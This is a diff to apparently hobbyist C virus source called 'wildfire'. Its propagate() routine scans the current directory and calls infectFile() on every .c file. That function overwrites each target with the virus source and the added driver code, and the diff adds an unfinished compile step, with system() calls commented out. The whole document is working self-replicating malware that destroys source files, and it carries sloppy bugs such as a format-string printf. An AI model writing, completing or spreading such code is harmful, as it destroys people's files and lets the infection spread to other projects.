@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdlib.h>
 
 #include "dirent.h"
 #include "wildfire.h"
@@ -13,12 +14,12 @@ void propagate()
     {
         while ((dir = readdir(d)) != 0)
         {
-            //printf("%s\n", fileName);
+            printf("%s\n", dir->d_name);
             const char *fileName = dir->d_name;
             const char *fileNameExtension = getFileNameExtension(fileName);
             if ((strcmp(fileNameExtension, "c") == 0))
             {
-                //printf(fileName);
+                printf(fileName);
                 infectFile(fileName);
             }
         }
@@ -39,6 +40,7 @@ const char *getFileNameExtension(const char *fileName)
 void infectFile(const char *fileName)
 {
     FILE *virus = fopen("src/wildfire.c", "r");
+    FILE *driver = fopen("src/main.c", "r");
     FILE *target = fopen(fileName, "w");
     char ch;
 
@@ -48,5 +50,18 @@ void infectFile(const char *fileName)
     }
 
     fclose(virus);
+
+    while ((ch = getc(driver)) != EOF)
+    {
+        putc(ch, target);
+    }
+
+    fclose(driver);
     fclose(target);
+
+    char *compileCmd = "gcc ";
+    //printf(strcat(compileCmd, fileName));
+    printf(compileCmd);
+    //system(compileCmd);
+    //system("./a.exe");
 }
